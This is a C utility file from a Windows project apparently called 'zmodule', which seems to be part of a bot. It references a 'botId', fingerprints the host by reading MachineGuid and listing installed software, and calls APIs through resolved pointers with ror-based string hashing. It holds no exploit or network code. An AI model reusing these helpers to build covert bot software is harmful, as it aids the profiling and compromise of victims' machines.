#include "zmodule.h"
#include "utils.h"
#include "string.h"
#include "memory.h"
#include "logger.h"


/*
* Number of 100 nanosecond units from 1/1/1601 to 1/1/1970
*/
#define EPOCH_BIAS  116444736000000000i64

#define _MAX__TIME32_T     0x7fffd27f           /* number of seconds from
00:00:00, 01/01/1970 UTC to
23:59:59, 01/18/2038 UTC */

/*
* Union to facilitate converting from FILETIME to unsigned __int64
*/
typedef union {
	unsigned __int64 ft_scalar;
	FILETIME ft_struct;
} FT;

uint32_t __stdcall utils_unixtime(int inUTC)
{
	SYSTEMTIME st;
	__time64_t unixTime;
	FT nt_time;

    if (inUTC) {
        fn_GetSystemTime(&st);
    }
    else {
        fn_GetLocalTime(&st);
    }
	fn_SystemTimeToFileTime(&st, &nt_time.ft_struct);

	//GetSystemTimeAsFileTime(&nt_time.ft_struct);
#ifdef _WIN64
	unixTime = (__time64_t)((nt_time.ft_scalar - EPOCH_BIAS) / 10000000i64);
#else
	unixTime = (__time64_t)fn__aulldiv(nt_time.ft_scalar - EPOCH_BIAS, 10000000i64);
#endif // _WIN64

	if (unixTime > (__time64_t)(_MAX__TIME32_T)) {
		unixTime = (__time64_t)-1;
	}

	return (uint32_t)unixTime;
}

uint32_t __stdcall ror(uint32_t value, int places)
{
	return (value >> places) | (value << (32 - places));
}

uint32_t __stdcall rol(uint32_t value, int places)
{
	return (value << places) | (value >> (32 - places));
}


uint32_t __stdcall utils_strhash(const char* str)
{
	char ch;
	uint32_t dwData = 0;
	while (*str != '\0') {
		ch = *(str++);
		dwData = ror(dwData, 11);
		dwData += (uint32_t)ch;
	}
	return dwData;
}

uint32_t __stdcall utils_wcshash(const wchar_t* str)
{
	wchar_t ch;
	uint32_t dwData = 0;
	while (*str != L'\0') {
		ch = *str++;
		dwData = ror(dwData, 11);
		dwData += (uint32_t)ch;
	}
	return dwData;
}

uint32_t __stdcall utils_wcsihash(const wchar_t* str)
{
	wchar_t* itr;
	wchar_t lowerStr[1024];

	__stosb((uint8_t*)lowerStr, 0, sizeof(lowerStr));
	itr = lowerStr;
	for (; *str != L'\0'; ++str, ++itr) {
		*itr = *str | 0x0020;
	}

	return utils_wcshash(lowerStr);
}

DWORD __stdcall utils_create_thread(LPTHREAD_START_ROUTINE pvFunc, PVOID pvParam, PHANDLE phHandle, DWORD dwWaitSec)
{
	HANDLE hThread;
	DWORD dwExitCode = 0;

	hThread = fn_CreateThread(NULL, 0, pvFunc, pvParam, 0, NULL);
	if (hThread) {
		if (dwWaitSec != 0) {
			if (fn_WaitForSingleObject(hThread, (dwWaitSec == INFINITE ? dwWaitSec : dwWaitSec * 1000)) == WAIT_OBJECT_0) {
				fn_GetExitCodeThread(hThread, &dwExitCode);
			}
		}

        if (phHandle != NULL) {
            *phHandle = hThread;
        }
        else {
			fn_CloseHandle(hThread);
		}
	}

	return dwExitCode;
}


void __stdcall utils_crc32_build_table(void)
{
	int i, j;
	uint32_t v1;
	uint8_t v3;

	for (i = 0; i < 256; ++i) {
		v1 = 2 * i;
		for (j = 9; j > 0; --j) {
			v3 = v1 & 1;
			v1 >>= 1;
			if (v3) {
				v1 ^= 0xEDB88320;
			}
		}
		_pZmoduleBlock->crcTable[i] = v1;
	}
}

uint32_t __stdcall utils_crc32_update(uint32_t crc32, const uint8_t* buffer, uint32_t size)
{
	uint32_t i;

	crc32 = ~crc32;
	for (i = size; i > 0; --i) {
		crc32 = (crc32 >> 8) ^ _pZmoduleBlock->crcTable[(uint8_t)((*(buffer++)) ^ crc32)];
	}
	return ~crc32;

}

void __stdcall utils_str_random(char* outStr, uint32_t bufferLen)
{
    char* end = outStr + bufferLen - 1;
    
    outStr[bufferLen - 1] = '\0';
    for (; outStr != end; ++outStr) {
        char ch = (char)(utils_random() % 3);
        if (ch == 0) {
            ch = '0' + (char)(utils_random() % 10);
        }
        else if (ch == 1) {
            ch = 'a' + (char)(utils_random() % 26);
        }
        else {
            ch = 'A' + (char)(utils_random() % 26);
        }

        *outStr = ch;
    }
}

void __stdcall utils_wcs_random(wchar_t* outStr, uint32_t bufferLen)
{
    wchar_t* wStr;
    char* str = memory_alloc(bufferLen);
    utils_str_random(str, bufferLen);
    utils_utf8_to_utf16(str, outStr, bufferLen);
    memory_free(str);
}


char* __stdcall utils_machine_guid(void)
{
	if (_pZmoduleBlock->machineGuid == NULL) {
		wchar_t* wcsValue = native_complete_query_registry_string(NATIVE_KEY_LOCAL_MACHINE, KEY_READ | KEY_WOW64_32KEY, L"Software\\Microsoft\\Cryptography", L"MachineGuid");
		if (wcsValue == NULL) {
			wcsValue = native_complete_query_registry_string(NATIVE_KEY_LOCAL_MACHINE, KEY_READ | KEY_WOW64_64KEY, L"Software\\Microsoft\\Cryptography", L"MachineGuid");
		}

		if (wcsValue != NULL) {
			_pZmoduleBlock->machineGuid = zs_to_str(wcsValue, CP_ACP);
			LOG("MachineGuid: %s", _pZmoduleBlock->machineGuid);
		}
	}

	return _pZmoduleBlock->machineGuid;
}

char* __stdcall utils_get_machine_key(void)
{
    if (_pZmoduleBlock->machineKey == NULL) {
        uint32_t sz = sizeof(_pZmoduleBlock->botId);
        _pZmoduleBlock->machineKey = utils_hash(CALG_SHA_256, PROV_RSA_AES, _pZmoduleBlock->botId, &sz, 1);
    }

    return _pZmoduleBlock->machineKey;
}


#define    IS_KEY_LEN 4095

void __stdcall utils_update_installed_software()
{
	uint32_t i;
	DWORD access;
	HANDLE hKey;
	NTSTATUS ntStatus;
	wchar_t* zsRegPath = zs_new(L"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
	wchar_t* zsRegKeyDispName = zs_new(L"DisplayName");
	wchar_t* zsRegKeyUninstStr = zs_new(L"UninstallString");

	if (_pZmoduleBlock->softwareDisplayNames != NULL) {
		vector_destroy(_pZmoduleBlock->softwareDisplayNames);
	}
	_pZmoduleBlock->softwareDisplayNames = vector_new();

	if (_pZmoduleBlock->softwareUninstallStrings != NULL) {
		vector_destroy(_pZmoduleBlock->softwareUninstallStrings);
	}
	_pZmoduleBlock->softwareUninstallStrings = vector_new();

	LOG("List of installed software");

	for (i = 0; i < 2; ++i) {
		if (i == 0) {
			access = KEY_WOW64_32KEY | KEY_READ;
		}
		else {
			access = KEY_WOW64_64KEY | KEY_READ;
		}

		ntStatus = native_open_key(&hKey, access, NATIVE_KEY_LOCAL_MACHINE, zsRegPath, 0);
		if (NT_SUCCESS(ntStatus)) {
			ULONG index;
			for (index = 0; ; ++index) {
				wchar_t* zpathName;
				PKEY_BASIC_INFORMATION pInfo = NULL;
				ntStatus = native_enumerate_key(hKey, KeyBasicInformation, index, &pInfo);
				if (ntStatus == STATUS_NO_MORE_ENTRIES || !NT_SUCCESS(ntStatus)) {
					break;
				}
				
				zpathName = zs_duplicate(zsRegPath);
				if (zpathName != NULL && (zpathName = zs_cat(zpathName, _pZmoduleBlock->slashString)) && (zpathName = zs_cat(zpathName, pInfo->Name))) {
					wchar_t* zsDisplayName;
					wchar_t* zsUninstallString;
					zsDisplayName = native_complete_query_registry_string(NATIVE_KEY_LOCAL_MACHINE, access, zpathName, zsRegKeyDispName);
					zsUninstallString = native_complete_query_registry_string(NATIVE_KEY_LOCAL_MACHINE, access, zpathName, zsRegKeyUninstStr);

					if (zsDisplayName != NULL && zsUninstallString != NULL) {
						vector_push_back(_pZmoduleBlock->softwareDisplayNames, zsDisplayName);
						vector_push_back(_pZmoduleBlock->softwareUninstallStrings, zsUninstallString);
						LOG("Display name: %S", zsDisplayName);
						LOG("Uninstall string: %S", zsUninstallString);
					}
					else {
						zs_free(zsDisplayName);
						zs_free(zsUninstallString);
					}

					zs_free(zpathName);
				}
				
				memory_free(pInfo);
			}
			fn_NtClose(hKey);
		}
	}

	zs_free(zsRegPath);
	zs_free(zsRegKeyDispName);
	zs_free(zsRegKeyUninstStr);
}

uint8_t* __stdcall utils_hash(ALG_ID algId, DWORD dwProvType, const uint8_t* data, uint32_t* pSize, int inHex)
{
	HCRYPTPROV provider = 0;
	HCRYPTHASH hash = 0;
	DWORD hashLen = 0;
	DWORD bufferSize = sizeof(hashLen);
	char* ret = NULL;

	do {
        if (!fn_CryptAcquireContextW(&provider, 0, 0, dwProvType, CRYPT_VERIFYCONTEXT)) {
			break;
		}

		if (!fn_CryptCreateHash(provider, algId, 0, 0, &hash)) {
			break;
		}

		if (!fn_CryptHashData(hash, (BYTE*)data, *pSize, 0)) {
			break;
		}

		if (!fn_CryptGetHashParam(hash, HP_HASHSIZE, (uint8_t*)&hashLen, &bufferSize, 0)) {
			break;
		}
		if (hashLen == 0) {
			break;
		}
		*pSize = hashLen;
		ret = (char*)memory_alloc(hashLen);
		if (!fn_CryptGetHashParam(hash, HP_HASHVAL, ret, &hashLen, 0)) {
			memory_free(ret);
			ret = NULL;
			break;
		}

        if (inHex) {
            static const char hexDigits[] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};
            char* hexStr = (char*)memory_alloc(hashLen << 1);
            uint32_t i;
            for (i = 0; i < hashLen; ++i) {
                hexStr[2 * i + 1] = hexDigits[ret[i] & 0x0F];
                hexStr[2 * i] = hexDigits[(ret[i] >> 4) & 0x0F];
            }
            *pSize = hashLen << 1;

            memory_free(ret);
            ret = hexStr;
        }
	} while (0);

	if (provider != 0) {
		fn_CryptReleaseContext(provider, 0);
	}

	if (hash != 0) {
		fn_CryptDestroyHash(hash);
	}

	return ret;
}

int __stdcall utils_isctype(int c, wctype_t type)
{
    WORD ret;
 
    if (fn_GetStringTypeW(CT_CTYPE1, (LPCWSTR)&c, 1, &ret) && (ret & type) != 0) {
        return 1;
    }
    return 0;
}
 
int __stdcall utils_isalpha(int c)
{
    return utils_isctype(c, C1_ALPHA);
}

int __stdcall utils_isalphanum(int c)
{
	return utils_isctype(c, C1_ALPHA | C1_DIGIT);
}

int __stdcall utils_isspace(int c)
{
    return utils_isctype(c, C1_SPACE);
}

BOOL __stdcall utils_file_write(const wchar_t* filePath, DWORD dwFlags, uint8_t* pBuffer, DWORD dwSize)
{
    BOOL bRet = FALSE;
    HANDLE hFile;

    hFile = fn_CreateFileW(filePath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, dwFlags, FILE_ATTRIBUTE_NORMAL, 0);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD remain = dwSize, written = 0;
        while (remain != 0) {
            bRet = fn_WriteFile(hFile, pBuffer + written, remain, &dwSize, NULL);
            remain -= dwSize;
            written += dwSize;
        }
        fn_SetEndOfFile(hFile);
        fn_FlushFileBuffers(hFile);
        fn_CloseHandle(hFile);
    }

    return bRet;
}

uint8_t* __stdcall utils_file_read(const wchar_t* lpFile, uint32_t* pdwSize)
{
    uint8_t* pvBuffer = NULL;
    HANDLE hFile;

    hFile = fn_CreateFileW(lpFile, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD dwSize, remain, readed;

        dwSize = fn_GetFileSize(hFile, NULL);
        pvBuffer = (uint8_t*)memory_alloc(dwSize);
        remain = dwSize;
        readed = 0;
        while (remain != 0 && dwSize != 0) {
            fn_ReadFile(hFile, pvBuffer + readed, remain, &dwSize, NULL);
            remain -= dwSize;
            readed += dwSize;
        }

        if (pdwSize != NULL) {
            *pdwSize = (uint32_t)readed;
        }
        fn_CloseHandle(hFile);
    }

    return pvBuffer;
}

ulong_t _seed = 0;

ulong_t utils_random()
{
    if (_seed == 0) {
        _seed = fn_GetTickCount();
    }

    return fn_RtlRandomEx(&_seed);
}

wchar_t* __stdcall utils_get_known_path(REFKNOWNFOLDERID rfid)
{
    wchar_t* zs = NULL;
    PWSTR path;

    if (!FAILED(fn_SHGetKnownFolderPath(rfid, 0, NULL, &path))) {
        zs = zs_new(path);
        fn_CoTaskMemFree(path);
    }

    return zs;
}

char* __stdcall utils_strdup(const char* str)
{
    char* s = memory_alloc(fn_lstrlenA(str) + 1);
    fn_lstrcpyA(s, str);
    return s;
}

wchar_t* __stdcall utils_wcsdup(const wchar_t* str)
{
    char* s = memory_alloc((fn_lstrlenW(str) + 1) << 1);
    fn_lstrcpyW(s, str);
    return s;
}

int __stdcall utils_utf16_to_utf8(const wchar_t* utf16Buffer, size_t utf16Size, char* utf8Buffer, size_t utf8Size)
{
    return fn_WideCharToMultiByte(CP_UTF8, 0, utf16Buffer, utf16Size, utf8Buffer, utf8Size, NULL, NULL);
}

int __stdcall utils_utf8_to_utf16(const char* utf8Buffer, wchar_t* utf16Buffer, size_t utf16Size)
{
    return fn_MultiByteToWideChar(CP_UTF8, 0, utf8Buffer, -1, utf16Buffer, utf16Size);
}

wchar_t* __stdcall utils_utf16(const char* utf8Buffer)
{
    wchar_t* ret;
    int nameSize = utils_utf8_to_utf16(utf8Buffer, NULL, 0) * sizeof(wchar_t);
    ret = (wchar_t*)memory_alloc(nameSize);

    if (!utils_utf8_to_utf16(utf8Buffer, ret, nameSize / sizeof(wchar_t))) {
        memory_free(ret);
        ret = NULL;
    }

    return ret;
}